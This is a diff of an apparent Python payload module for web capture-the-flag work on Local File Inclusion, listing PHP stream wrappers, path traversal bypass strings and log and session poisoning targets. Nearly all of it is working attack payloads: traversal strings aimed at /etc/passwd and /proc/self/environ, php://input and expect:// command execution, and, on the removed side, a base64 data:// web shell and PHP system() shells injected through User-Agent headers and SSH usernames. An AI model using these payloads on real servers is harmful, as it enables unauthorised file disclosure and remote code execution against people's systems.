@@ -1,117 +1,164 @@
 """
-LFI (Local File Inclusion), PHP Wrappers, and Log Poisoning Toolkit for Web CTF.
-Covers PHP filter tricks, traversal bypasses, and poisoning vectors.
+LFI (Local File Inclusion) & PHP Stream Wrapper Payload Crafter.
+Provides PHP wrappers, path traversal bypasses, and log/session poisoning references.
 """
 
-from typing import List, Dict
+from typing import List, Dict, Any
 
-def get_php_wrappers(filename: str = "index.php") -> List[Dict[str, str]]:
-    """Generate PHP stream wrappers for source code disclosure and code execution."""
+
+def get_php_wrappers(target_file: str = "index.php") -> List[Dict[str, str]]:
+    """Return a list of PHP stream wrapper payloads for reading source code."""
     return [
         {
-            "name": "PHP Filter Base64 Read (Most Common)",
-            "payload": f"php://filter/convert.base64-encode/resource={filename}",
-            "desc": "Reads PHP source file encoded in Base64 before server executes it."
+            "name": "php://filter base64",
+            "payload": f"php://filter/convert.base64-encode/resource={target_file}",
+            "desc": "Read source code as base64 (bypasses direct execution)"
         },
         {
-            "name": "PHP Filter ROT13 Read",
-            "payload": f"php://filter/string.rot13/resource={filename}",
-            "desc": "Bypasses keyword/base64 filters using ROT13 stream."
+            "name": "php://filter rot13",
+            "payload": f"php://filter/read=string.rot13/resource={target_file}",
+            "desc": "Read source code ROT13-encoded"
         },
         {
-            "name": "PHP Filter Multi-Chained Filters",
-            "payload": f"php://filter/string.strip_tags|convert.base64-encode/resource={filename}",
-            "desc": "Chains multiple filter conversions."
+            "name": "php://filter strip_tags",
+            "payload": f"php://filter/read=string.strip_tags/resource={target_file}",
+            "desc": "Strip HTML tags to reveal PHP source"
         },
         {
-            "name": "PHP Data Wrapper RCE (POST/GET)",
-            "payload": "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+",
-            "desc": "Executes PHP code via data:// wrapper (<?php system($_GET['cmd']); ?>)."
+            "name": "php://filter zlib",
+            "payload": f"php://filter/zlib.deflate/convert.base64-encode/resource={target_file}",
+            "desc": "Compressed base64 source read"
         },
         {
-            "name": "PHP Input Stream RCE",
+            "name": "php://input",
             "payload": "php://input",
-            "desc": "Send '<?php system(\"id\"); ?>' as raw HTTP POST request body."
+            "desc": "Read POST body as file (for LFI to RCE)"
         },
         {
-            "name": "PHP Expect Wrapper RCE",
+            "name": "data:// wrapper",
+            "payload": "data://text/plain;base64,PD9waHAgZWNobyAncG5nJzsgPz4=",
+            "desc": "data:// wrapper for code execution"
+        },
+        {
+            "name": "expect:// wrapper",
             "payload": "expect://id",
-            "desc": "Direct command execution if php-expect module is installed."
+            "desc": "expect:// wrapper for command execution (requires expect extension)"
         },
         {
-            "name": "ZIP / PHAR Archive Inclusion",
-            "payload": f"zip://uploads/shell.zip%23shell.php&cmd=id",
-            "desc": "Executes compressed PHP script inside uploaded zip archive."
+            "name": "phar:// wrapper",
+            "payload": f"phar://{target_file}",
+            "desc": "PHAR deserialization wrapper"
+        },
+        {
+            "name": "zip:// wrapper",
+            "payload": f"zip://{target_file}#shell",
+            "desc": "ZIP archive wrapper"
+        },
+        {
+            "name": "php://filter iconv",
+            "payload": f"php://filter/convert.iconv.utf-8.utf-16/resource={target_file}",
+            "desc": "Iconv conversion to bypass filters"
         }
     ]
+
 
 def get_traversal_bypasses(target_file: str = "/etc/passwd") -> List[Dict[str, str]]:
-    """Generate Path Traversal payloads with filter bypasses."""
-    tf_clean = target_file.lstrip("/")
+    """Return a list of path traversal bypass payloads."""
     return [
         {
-            "name": "Standard Dot-Dot-Slash",
-            "payload": f"../../../../../../../../{tf_clean}",
-            "desc": "Traverses back to filesystem root."
+            "name": "Basic traversal",
+            "payload": f"../../../../../../../../..{target_file}",
+            "desc": "Standard directory traversal"
         },
         {
-            "name": "Nested Strip Bypass (....//)",
-            "payload": f"....//....//....//....//....//{tf_clean}",
-            "desc": "Bypasses simple non-recursive string replacement of '../'."
+            "name": "Double encoding",
+            "payload": f"..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f{target_file}",
+            "desc": "Double URL-encoded traversal (bypasses basic filters)"
         },
         {
-            "name": "URL Encoded Traversal (%2e%2e%2f)",
-            "payload": f"%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f{tf_clean}",
-            "desc": "Single URL encoded dots and slashes."
+            "name": "Nested traversal",
+            "payload": f"....//....//....//....//....//....//....//....//{target_file}",
+            "desc": "Nested slashes bypass (....// = ../)"
         },
         {
-            "name": "Double URL Encoded (%252e%252e%252f)",
-            "payload": f"%252e%252e%252f%252e%252e%252f%252e%252e%252f{tf_clean}",
-            "desc": "Double URL encoding to bypass reverse proxy decoders."
+            "name": "URL encoded",
+            "payload": f"..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f{target_file}",
+            "desc": "URL-encoded slashes"
         },
         {
-            "name": "Null Byte Termination (%00)",
-            "payload": f"../../../../../../../../{tf_clean}%00.php",
-            "desc": "Truncates trailing extensions in PHP <= 5.3.4."
+            "name": "Null byte",
+            "payload": f"../../../../../../../../..{target_file}%00",
+            "desc": "Null byte truncation (PHP < 5.3.4)"
         },
         {
-            "name": "Path Truncation (. / . / . /)",
-            "payload": f"../../../../../../../../{tf_clean}" + "/." * 200,
-            "desc": "Exceeds OS MAX_PATH buffer limit to drop appended extension."
+            "name": "Absolute path",
+            "payload": target_file,
+            "desc": "Direct absolute path"
+        },
+        {
+            "name": "Windows traversal",
+            "payload": f"..\\..\\..\\..\\..\\..\\..\\..\\..\\{target_file}",
+            "desc": "Windows backslash traversal"
+        },
+        {
+            "name": "Double slash",
+            "payload": f"..//..//..//..//..//..//..//..//{target_file}",
+            "desc": "Double slash bypass"
+        },
+        {
+            "name": "Mixed encoding",
+            "payload": f"..%c0%af..%c0%af..%c0%af..%c0%af{target_file}",
+            "desc": "UTF-8 overlong encoding bypass"
+        },
+        {
+            "name": "Proc self environ",
+            "payload": "../../../../../../../../proc/self/environ",
+            "desc": "Read process environment (may contain secrets)"
         }
     ]
 
+
 def get_poisoning_targets() -> List[Dict[str, str]]:
-    """Common LFI log and session poisoning file paths."""
+    """Return a list of log/session poisoning targets."""
     return [
         {
             "name": "Apache Access Log",
             "path": "/var/log/apache2/access.log",
-            "technique": "Poison User-Agent header with: <?php system($_GET['c']); ?>"
+            "technique": "Inject code in User-Agent, then LFI the log"
+        },
+        {
+            "name": "Apache Error Log",
+            "path": "/var/log/apache2/error.log",
+            "technique": "Inject code in request, then LFI the error log"
         },
         {
             "name": "Nginx Access Log",
             "path": "/var/log/nginx/access.log",
-            "technique": "Send HTTP request with <?php system($_GET['c']); ?> in headers"
+            "technique": "Inject code in User-Agent, then LFI the log"
+        },
+        {
+            "name": "PHP Session File",
+            "path": "/var/lib/php/sessions/sess_<PHPSESSID>",
+            "technique": "Set session value to code, then LFI session file"
         },
         {
             "name": "SSH Auth Log",
             "path": "/var/log/auth.log",
-            "technique": "Run: ssh '<?php system($_GET[\"c\"]); ?>'@target_ip"
+            "technique": "Inject code in SSH username, then LFI the log"
         },
         {
-            "name": "PHP Session File",
-            "path": "/tmp/sess_<PHPSESSID> or /var/lib/php/sessions/sess_<PHPSESSID>",
-            "technique": "Store PHP payload in session value or cookie and include session file"
+            "name": "Mail Log",
+            "path": "/var/log/mail.log",
+            "technique": "Inject code in email headers, then LFI the log"
         },
         {
-            "name": "Linux Process Environ",
+            "name": "Proc Self Environ",
             "path": "/proc/self/environ",
-            "technique": "Inject PHP code into User-Agent or HTTP headers captured in environment"
+            "technique": "Inject code in User-Agent, then LFI /proc/self/environ"
         },
         {
-            "name": "Linux File Descriptors",
-            "path": "/proc/self/fd/0 to /proc/self/fd/30",
-            "technique": "Include active request stream descriptors"
+            "name": "Proc Self Fd",
+            "path": "/proc/self/fd/<N>",
+            "technique": "Brute-force file descriptors for request body"
         }
     ]
